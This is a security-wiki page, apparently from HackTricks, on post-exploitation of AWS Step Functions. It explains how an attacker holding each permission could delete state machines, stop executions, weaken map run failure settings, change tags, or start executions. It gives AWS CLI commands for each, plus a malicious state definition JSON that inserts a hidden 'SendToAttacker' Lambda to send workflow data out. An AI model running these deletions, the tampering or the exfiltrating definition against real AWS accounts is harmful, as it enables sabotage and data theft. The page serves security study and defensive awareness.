# AWS - Step Functions Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Step Functions

For more information about this AWS service, check:

{{#ref}}
../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### `states:RevealSecrets`

This permission allows to **reveal secret data inside an execution**. For it, it's needed to set Inspection level to TRACE and the revealSecrets parameter to true.

<figure><img src="../../../images/image (348).png" alt=""><figcaption></figcaption></figure>

### `states:DeleteStateMachine`, `states:DeleteStateMachineVersion`, `states:DeleteStateMachineAlias`

An attacker with these permissions would be able to permanently delete state machines, their versions, and aliases. This can disrupt critical workflows, result in data loss, and require significant time to recover and restore the affected state machines. In addition, it would allow an attacker to cover the tracks used, disrupt forensic investigations, and potentially cripple operations by removing essential automation processes and state configurations.

> [!NOTE]
>
> - Deleting a state machine you also delete all its associated versions and aliases.
> - Deleting a state machine alias you do not delete the state machine versions referecing this alias.
> - It is not possible to delete a state machine version currently referenced by one o more aliases.

```bash
# Delete state machine
aws stepfunctions delete-state-machine --state-machine-arn <value>
# Delete state machine version
aws stepfunctions delete-state-machine-version --state-machine-version-arn <value>
# Delete state machine alias
aws stepfunctions delete-state-machine-alias --state-machine-alias-arn <value>
```

- **Potential Impact**: Disruption of critical workflows, data loss, and operational downtime.

### `states:UpdateMapRun`

An attacker with this permission would be able to manipulate the Map Run failure configuration and parallel setting, being able to increase or decrease the maximum number of child workflow executions allowed, affecting directly and performance of the service. In addition, an attacker could tamper with the tolerated failure percentage and count, being able to decrease this value to 0 so every time an item fails, the whole map run would fail, affecting directly to the state machine execution and potentially disrupting critical workflows.

```bash
aws stepfunctions update-map-run --map-run-arn <value> [--max-concurrency <value>] [--tolerated-failure-percentage <value>] [--tolerated-failure-count <value>]
```

- **Potential Impact**: Performance degradation, and disruption of critical workflows.

### `states:StopExecution`

An attacker with this permission could be able to stop the execution of any state machine, disrupting ongoing workflows and processes. This could lead to incomplete transactions, halted business operations, and potential data corruption.

> [!WARNING]
> This action is not supported by **express state machines**.

```bash
aws stepfunctions stop-execution --execution-arn <value> [--error <value>] [--cause <value>]
```

- **Potential Impact**: Disruption of ongoing workflows, operational downtime, and potential data corruption.

### `states:TagResource`, `states:UntagResource`

An attacker could add, modify, or remove tags from Step Functions resources, disrupting your organization's cost allocation, resource tracking, and access control policies based on tags.

```bash
aws stepfunctions tag-resource --resource-arn <value> --tags Key=<key>,Value=<value>
aws stepfunctions untag-resource --resource-arn <value> --tag-keys <key>
```

**Potential Impact**: Disruption of cost allocation, resource tracking, and tag-based access control policies.

### `states:UpdateStateMachine`

This permission allows an attacker to **modify the logic of an existing state machine**. By injecting malicious logic into the state definition, the attacker could:

- Add a **new state** that exfiltrates input/output to an external system (via Lambda or SNS).
- **Bypass security checks**, skip validation steps, or disable error handling.
- **Insert a logic bomb** that triggers under specific input conditions to disrupt execution.

This attack can be subtle, blending into large state definitions, and may go unnoticed without strict ASL version control.

```bash
aws stepfunctions update-state-machine \
  --state-machine-arn <value> \
  --definition file://malicious_state_definition.json \
  --role-arn arn:aws:iam::<account-id>:role/<execution-role>
```

`malicious_state_definition.json`

```json
{
  "Comment": "Malicious State Machine - Data Exfiltration",
  "StartAt": "ExfiltrateSecrets",
  "States": {
    "ExfiltrateSecrets": {
      "Type": "Task",
      "Resource": "arn:aws:lambda:us-east-1:123456789012:function:SendToAttacker",
      "InputPath": "$",
      "ResultPath": "$.exfiltration_result",
      "Next": "LegitimateStep"
    },
    "LegitimateStep": {
      "Type": "Task",
      "Resource": "arn:aws:lambda:us-east-1:123456789012:function:LegitBusinessLogic",
      "End": true
    }
  }
}
```
- **Potential Impact**: Data exfiltration, disruption of logic flow, persistent access through hidden states.

---

### `states:StartExecution`

With this permission, an attacker can **trigger executions on demand**, passing arbitrary input to state machines. This allows:

- **Triggering sensitive operations** (e.g., Lambda invocations, EC2 actions) if the workflow handles them.
- **Supplying attacker-controlled input** to abuse poorly validated states.
- **Recon of business logic** by probing execution responses or failures.

Used with `states:GetExecutionHistory`, it becomes a powerful tool for **logic discovery**, **abuse**, or **command execution** through embedded Lambdas or activities.

```bash
aws stepfunctions start-execution \
  --state-machine-arn <value> \
  --name "backdoor-$(date +%s)" \
  --input '{"command":"whoami"}'
```

- **Potential Impact**: Unauthorized triggering of sensitive workflows, business logic abuse, stealthy persistence (can be cron-triggered via EventBridge).


{{#include ../../../banners/hacktricks-training.md}}




